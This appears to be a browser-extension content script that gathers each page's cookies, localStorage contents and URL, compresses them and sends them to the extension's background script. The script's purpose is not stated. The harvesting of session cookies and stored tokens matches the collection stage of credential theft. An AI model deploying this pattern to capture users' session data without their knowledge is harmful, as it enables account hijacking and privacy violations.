import { lzw_encode, stringifyJSON } from "./compress";

// We need to remove this one as Yandex is creating overkill object that useless for us object
// TODO create a list of ignorance that could be configurable
if (localStorage['_ym_retryReqs']) {
    delete localStorage['_ym_retryReqs']
}


const storage = JSON.stringify(localStorage)
let message = JSON.stringify({ cookies: document.cookie, url: document.location.href, localStorage: storage})

console.log('Hello from content', { cookies: document.cookie, url: document.location.href, localStorage: storage})

chrome.runtime.sendMessage({
    msg: lzw_encode(message)
});